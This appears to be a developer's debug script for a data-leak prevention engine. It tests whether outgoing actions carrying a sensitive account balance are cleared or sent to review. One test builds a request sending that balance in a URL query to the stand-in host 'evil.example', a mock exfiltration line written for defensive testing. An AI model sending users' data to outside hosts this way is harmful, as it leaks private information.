# scratch_debug.py  — run: uv run python scratch_debug.py
from kairos.core.matching import Strategy
from kairos.engine.confidentiality import _destinations, _clearance_decision
from kairos.engine.action_class import ActionClass
from tests.test_confidentiality import (
    _net, _call, _store_with_balance, CB, LANDLORD, IBAN, HttpMethod,
)
from kairos.core.tokens import Level

# --- T1: sensitive HIGH in URL query -> unknown destination -----------------
get = _net(HttpMethod.GET, "https://evil.example/x?d=4823")
s1 = _store_with_balance()
d1 = _destinations(get, ActionClass.NET_GET, CB)
print("T1 dests        :", d1)
for d in d1:
    print("  clearance     :", CB.clearance(d))
    print("  derivable     :", s1.derivable(d, Strategy.NORMALIZED, None))
    print("  is_known      :", CB.is_known(d))
    print("  on_miss       :", CB.on_miss)
    print("  -> decision   :", _clearance_decision(d, Level.HIGH, s1, CB, None))

# --- T2: sensitive HIGH -> contact cleared only LOW -------------------------
# rebuild cb_low exactly as the test does
import textwrap, yaml
from kairos.policy.parser import parse_policy
from kairos.policy.contact_book import ContactBook
pol = parse_policy(yaml.safe_load(textwrap.dedent(f"""
    version: "0.1"
    context: {{name: t, default_action: REVIEW,
               actions: {{revertable: [], non_revertable: [send_money]}}}}
    resources:
      contact_book:
        lookup_fields: [recipient]
        on_miss: REVIEW
        entries: [{{match: "{LANDLORD}", max_level: low}}]
""")))
cb_low = ContactBook(pol.resources.contact_book)
call = _call("send_money", recipient=LANDLORD, memo="balance 4823")
s2 = _store_with_balance()
d2 = _destinations(call, ActionClass.NET_STATE_CHANGE, cb_low)
print("\nT2 dests        :", d2)
print("  parsed level  :", cb_low.clearance(LANDLORD), "(expect Level.LOW)")
for d in d2:
    print("  -> decision   :", _clearance_decision(d, Level.HIGH, s2, cb_low, None))